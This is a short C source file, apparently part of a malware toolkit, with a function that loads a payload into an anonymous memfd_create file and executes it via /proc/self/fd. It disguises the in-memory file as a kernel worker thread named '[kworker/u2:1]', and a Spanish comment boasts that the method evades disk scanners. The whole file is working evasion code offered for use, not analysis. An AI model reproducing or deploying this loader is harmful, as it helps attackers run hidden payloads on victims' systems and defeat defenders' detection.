#define _GNU_SOURCE
#include <unistd.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "common.h"
#include "memexec.h"

/* 
 * Pensamiento privado: 
 * El disco es para los débiles. Nosotros inyectamos directamente en las arterias del kernel.
 * memfd_create nos da un espacio anónimo, indetectable para los scanners de disco.
 */

int execute_from_mem(const unsigned char *payload, size_t payload_len, char *const argv[], char *const envp[]) {
    // syscall(__NR_memfd_create, name, flags)
    // MFD_CLOEXEC = 0x0001
    int fd = syscall(__NR_memfd_create, "[kworker/u2:1]", 1); 
    if (fd == -1) {
        return -1;
    }

    if (write(fd, payload, payload_len) != (ssize_t)payload_len) {
        close(fd);
        return -1;
    }

    // Para máxima compatibilidad usamos el path de /proc/self/fd/
    char fd_path[64];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);

    // No necesitamos fexecve explícito si usamos el descriptor vía procfs
    execve(fd_path, argv, envp);

    // Si execve falla...
    close(fd);
    return -1;
}
